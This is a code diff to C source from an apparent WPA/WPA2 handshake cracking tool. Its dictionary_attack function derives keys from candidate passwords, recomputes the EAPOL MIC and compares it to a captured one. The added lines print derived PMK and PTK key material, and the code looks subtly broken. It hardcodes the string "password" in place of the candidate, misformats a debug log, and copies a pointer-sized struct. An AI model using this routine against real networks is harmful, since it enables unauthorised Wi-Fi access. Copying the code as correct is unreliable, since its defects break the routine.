@@ -45,11 +45,11 @@ int hmac_hash(int ver, u8 *key, int hashlen, u8 *buf, int buflen, u8 *mic) {
 //		hmac_md5(key, hashlen, buf, buflen, mic);
 		break;
 	case WPA_KEY_INFO_TYPE_HMAC_SHA1_AES :
-		hmac_sha1(key, hashlen, buf, buflen, hash);
+		hmac_sha1(key, hashlen, buf, buflen, hash, NOCACHED);
 		memcpy(mic, hash, MD5_DIGEST_LENGTH); /* only 16 bytes, not 20. */
 		break;
 	default:
-		log_printf(MSG_WARNING, "Unknow encryption version.");
+		log_printf(MSG_WARNING, "Unknow encryption version 0x%x.", ver);
 		return -1;
 	}
 	return 0;
@@ -97,12 +97,25 @@ int dictionary_attack(const char *dictionary_path, struct encrypto_info *info) {
 	 	*/
 		if (fret < 8 || fret > 63) 
 			continue;
-
-		pbkdf2_sha1(info->password, info->SSID, strlen(info->SSID), 4096, pmk, sizeof(pmk));
+		log_printf(MSG_DEBUG, "password=%d, SSID=%s", info->password, info->SSID);
+		pbkdf2_sha1("password", info->SSID, strlen(info->SSID), 4096, pmk, sizeof(pmk), USECACHED);
+		printf("pmk = \n");
+		for(int i = 0; i < sizeof(pmk); i++){
+			printf("0x%x ", pmk[i]);
+		}	
+		printf("\n");
 		wpa_pmk_to_ptk(pmk, info->AA, info->SA, info->AN, info->SN, ptk, sizeof(ptk));
-	
+		printf("ptk = \n");
+		for(int i = 0; i < sizeof(ptk); i++) {
+			printf("0x%x ", ptk[i]);
+		}	
+		printf("\n");
 		ptkset = (struct wpa_ptk *)ptk;
-		hmac_hash(info->version, ptkset->mic_key, 16, info->eapol, info->eapol_frame_len, keymic);
+		struct wpa_eapol_key eapol_frame;
+		memcpy(&eapol_frame, info->eapol, sizeof(struct wpa_eapol_key));
+		memset(&eapol_frame.key_mic, 0, sizeof(eapol_frame.key_mic));
+
+		hmac_hash(info->version, ptkset->mic_key, 16, (u8 *)&eapol_frame, info->eapol_frame_len, keymic);
 
 		if (!memcmp(&info->MIC, &keymic, sizeof(keymic))) {
 			memcpy(&info->ptk, ptkset, sizeof(ptkset));
